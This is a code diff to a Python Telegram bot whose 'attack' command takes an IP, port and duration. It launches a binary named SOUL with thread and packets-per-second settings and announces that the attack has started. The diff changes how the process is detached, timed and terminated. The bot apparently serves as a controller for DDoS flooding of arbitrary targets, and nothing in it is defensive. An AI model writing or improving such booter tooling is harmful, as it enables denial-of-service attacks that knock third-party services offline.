@@ -26,6 +26,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     ip, port, duration = args
+
     try:
         os.chmod("./SOUL", 0o755)
 
@@ -34,14 +35,18 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"⚡ Attack started on {ip}:{port} for {duration} seconds."
         )
 
-        # Run SOUL in background
+        # Run SOUL in background (detached)
         process = await asyncio.create_subprocess_exec(
             "./SOUL", ip, str(port), str(duration), MAX_THREADS, MAX_PPS,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
 
-        # Wait for the attack to finish
+        # Wait for the actual duration
+        await asyncio.sleep(int(duration))
+
+        # Optionally, terminate SOUL in case it is still running
+        process.terminate()
         await process.wait()
 
         # Notify attack end
